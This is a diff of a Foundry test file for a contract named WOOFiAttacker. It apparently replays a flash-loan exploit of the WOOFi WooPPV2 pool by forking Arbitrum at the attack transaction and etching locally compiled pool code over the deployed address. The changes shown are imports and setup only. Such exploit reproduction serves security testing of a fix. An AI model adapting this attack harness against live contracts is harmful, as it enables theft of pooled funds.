@@ -1,9 +1,9 @@
 // SPDX-License-Identifier: GPL-2.0-or-later
-pragma solidity ^0.8.20;
+pragma solidity ^0.8.19;
 
-import {Test, console} from "lib/forge-std/src/Test.sol";
+import {Test, console} from "forge-std/Test.sol";
 
-import {IERC20} from 'lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol';
+import {IERC20} from 'forge-std/interfaces/IERC20.sol';
 
 import './interfaces/ITraderJoe.sol';
 import './interfaces/ISilo.sol';
@@ -12,6 +12,7 @@ import './interfaces/IWooPPV2.sol';
 import './interfaces/IWETH.sol';
 import './interfaces/IWooOracleV2.sol';
 
+import {WooPPV2} from "../src/WooPPV2.sol";
 
 
 /// @title Flash contract implementation
@@ -35,8 +36,10 @@ contract WOOFiAttacker is Test {
     }
 
     function setUp() public {
+        // WooPPV2 pp = new WooPPV2(USDC);
         bytes32 txHash = 0x57e555328b7def90e1fc2a0f7aa6df8d601a8f15803800a5aaf0a20382f21fbd;
         vm.createSelectFork("arb", txHash);
+        vm.etch(address(WOOPPV2), address(deployCode('WooPPV2.sol', abi.encode(USDC))).code);
     }
 
     /// @param fee0 The fee from calling flash for token0
